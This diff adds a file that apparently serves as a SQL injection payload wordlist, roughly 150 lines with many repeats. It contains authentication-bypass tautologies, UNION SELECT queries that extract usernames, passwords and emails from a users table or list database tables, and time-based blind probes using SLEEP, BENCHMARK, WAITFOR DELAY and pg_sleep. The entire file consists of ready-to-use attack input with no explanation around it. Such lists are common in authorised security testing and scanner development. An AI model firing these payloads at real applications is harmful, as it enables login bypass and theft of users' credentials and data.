@@ -1,0 +1,150 @@
+' 
+"
+' OR 1=1--
+" OR "1"="1
+' OR 1=1#
+" OR "1"="1"#
+' OR '1'='1' --
+' OR '1'='2' --
+' OR 'a'='a
+' OR 'x'='x'--
+') OR ('1'='1
+') OR ('x'='x
+' OR 1=1 LIMIT 1--
+' OR 1=1 /*
+' OR 1=2/*
+' OR SLEEP(5)--
+' OR BENCHMARK(1000000,MD5(1))--
+' AND 1=2--
+' AND 'a'='b
+" AND "1"="2
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+' OR '1'='1' ORDER BY 1--
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+' UNION SELECT username,password FROM users--
+' AND 1=1--
+' AND 1=2--
+' AND 1=1# 
+' AND 1=2#
+' OR 1=1#
+' OR 1=2#
+' OR '1'='1'#
+' OR '1'='2'#
+' OR 1=1/* 
+' OR 1=2/* 
+' OR '1'='1'/* 
+' OR '1'='2'/* 
+' OR 'a'='a'--
+' OR 'b'='b'--
+' OR 'x'='x'--
+' OR 1=1;--
+' OR 1=2;--
+' OR 1=1 LIMIT 1;--
+' OR 1=1 ORDER BY 1;--
+' OR 1=1 UNION SELECT null;--
+' OR 1=1 UNION SELECT 1,2,3;--
+' OR 1=1 UNION SELECT username,password FROM users;--
+' OR '1'='1' AND 'a'='a'--
+' OR '1'='1' AND 'b'='b'--
+' OR '1'='1' AND 'x'='x'--
+' OR 1=1 WAITFOR DELAY '0:0:5'--
+' OR IF(1=1,SLEEP(5),0)--
+' OR pg_sleep(5)--
+'; WAITFOR DELAY '0:0:5'--
+' OR 1=1-- # 
+' OR 1=2-- # 
+' OR '1'='1'-- # 
+' OR '1'='2'-- # 
+' OR 'a'='a'-- # 
+' OR 'b'='b'-- # 
+' OR 'x'='x'-- # 
+' OR 1=1/* 
+' OR 1=2/* 
+' OR '1'='1'/* 
+' OR '1'='2'/* 
+' OR '1'='1'-- 
+' OR '1'='2'-- 
+' OR '1'='1'# 
+' OR '1'='2'# 
+' OR 1=1-- 
+' OR 1=2-- 
+' OR 1=1# 
+' OR 1=2# 
+' OR 'a'='a'-- 
+' OR 'b'='b'-- 
+' OR 'x'='x'-- 
+' OR 1=1;-- 
+' OR 1=2;-- 
+' OR 1=1 LIMIT 1;-- 
+' OR 1=1 ORDER BY 1;-- 
+' OR 1=1 UNION SELECT null;-- 
+' OR 1=1 UNION SELECT 1,2,3;-- 
+' OR 1=1 UNION SELECT username,password FROM users;-- 
+' OR 1=1 WAITFOR DELAY '0:0:5';-- 
+' OR IF(1=1,SLEEP(5),0);-- 
+' OR pg_sleep(5);-- 
+' AND 1=1-- 
+' AND 1=2-- 
+' AND 1=1# 
+' AND 1=2# 
+' AND 'a'='a'-- 
+' AND 'b'='b'-- 
+' AND 'x'='x'-- 
+' AND 1=1;-- 
+' AND 1=2;-- 
+' AND 1=1 LIMIT 1;-- 
+' AND 1=1 ORDER BY 1;-- 
+' AND 1=1 UNION SELECT null;-- 
+' AND 1=1 UNION SELECT 1,2,3;-- 
+' AND 1=1 UNION SELECT username,password FROM users;-- 
+' AND 1=1 WAITFOR DELAY '0:0:5';-- 
+' AND IF(1=1,SLEEP(5),0);-- 
+' AND pg_sleep(5);-- 
+' OR 1=1#-- 
+' OR 1=2#-- 
+' OR '1'='1'#-- 
+' OR '1'='2'#-- 
+' OR 'a'='a'#-- 
+' OR 'b'='b'#-- 
+' OR 'x'='x'#-- 
+' OR 1=1/*-- 
+' OR 1=2/*-- 
+' OR '1'='1'/*-- 
+' OR '1'='2'/*-- 
+' OR 1=1%00-- 
+' OR 1=2%00-- 
+' OR '1'='1'%00-- 
+' OR '1'='2'%00-- 
+' OR 1=1;# 
+' OR 1=2;# 
+' OR '1'='1';# 
+' OR '1'='2';# 
+' OR 1=1 AND 1=1-- 
+' OR 1=1 AND 1=2-- 
+' OR 1=1 AND 'a'='a'-- 
+' OR 1=1 AND 'a'='b'-- 
+' OR 1=1 AND 1=1# 
+' OR 1=1 AND 1=2# 
+' OR 1=1 AND 'a'='a'# 
+' OR 1=1 AND 'a'='b'# 
+' UNION SELECT null-- 
+' UNION SELECT 1,2,3-- 
+' UNION SELECT username,password FROM users-- 
+' UNION SELECT table_name FROM information_schema.tables-- 
+' UNION SELECT name FROM sqlite_master-- 
+' UNION ALL SELECT NULL,NULL,NULL-- 
+' UNION ALL SELECT username,password,email FROM users-- 
+' AND 1=1 OR 1=1-- 
+' AND 1=1 OR 1=2-- 
+' AND 1=1 OR 'a'='a'-- 
+' AND 1=1 OR 'a'='b'-- 
+' OR 1=1 OR 1=1-- 
+' OR 1=1 OR 1=2-- 
+' OR 1=1 OR 'a'='a'-- 
+' OR 1=1 OR 'a'='b'-- 
+' OR 1=1; WAITFOR DELAY '0:0:5'-- 
+' OR 1=1; pg_sleep(5)-- 
+' OR 1=1; SELECT BENCHMARK(1000000,MD5(1))-- 
+' OR 1=1; SELECT SLEEP(5)-- 
+' OR 1=1; SELECT pg_sleep(5)-- 
